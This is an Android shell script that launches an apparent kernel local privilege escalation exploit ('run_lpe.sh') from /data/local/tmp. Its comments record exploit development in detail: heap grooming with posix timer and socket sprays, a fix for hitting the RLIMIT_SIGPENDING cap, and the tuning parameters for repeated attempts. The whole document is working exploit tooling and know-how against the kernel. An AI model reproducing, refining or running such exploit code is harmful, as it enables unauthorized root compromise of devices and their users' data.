#!/system/bin/sh
# run17: run16 geometry + the RLIMIT_SIGPENDING fix.
#
# run16 proved the pageset gate (6/8 attempts captured X) and reached a
# supported slot (L=0xa0), then died at "triggers failed": timer_create()
# returned EAGAIN.  alloc_posix_timer() gives every timer (SIGEV_NONE
# included) a sigqueue, and __sigqueue_alloc() refuses past the real uid's
# RLIMIT_SIGPENDING, so the uid-2000 budget (44145) is a global live-timer
# cap.  Each parked attempt kept its ~4185 padding timers, so by attempt 6
# there was no room left.  The binary now releases pads/flush timers before
# creating the triggers and again when an attempt parks.
#
# Reboot first: run16 left parked attempts that predate the fix.
cd /data/local/tmp || exit 1
rm -f ic-run17.log
IC_SLABTRACE=1 IC_PAD_ALIGN=1 IC_SPRAY_EARLY=1 IC_EARLY_WAIT=1 \
IC_EARLY_PRIME=1024 IC_EARLY_GATE=1 IC_SKB_SOCKS=8 \
IC_PAD_KEEP=4185 IC_FLUSH_SPARSE=15 IC_ATTEMPT_WAIT=150 \
  ATTEMPTS=10 nohup sh /data/local/tmp/run_lpe.sh > /data/local/tmp/ic-run17.log 2>&1 &
exit 0
